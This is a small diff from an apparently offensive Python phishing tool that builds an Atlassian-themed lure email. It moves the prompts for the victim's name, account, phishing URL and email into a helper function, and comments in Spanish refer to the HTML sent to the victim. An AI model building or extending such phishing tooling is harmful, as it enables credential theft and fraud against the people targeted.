@@ -2,18 +2,11 @@ import time
 import os
 import sys
 import smtplib
-from helper.helper import getPath
+from helper.helper import getPath,get_input_en
 
 def AtalassianEn():
     
-    #Información de la victima
-    userName = input("Introduce el nombre de tu victima-->")
-    userAccount = input("Introduce la cuenta de usuario de tu victima-->")
-    url=("Introduce el url de phishing-->")
-    userEmail=("Introduce el email de la victima-->")
-    
-    date=time.localtime()
-    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
+    get_input_en()
     
     ##HTML que se enviara a la victima
     atalasianHtml=("""
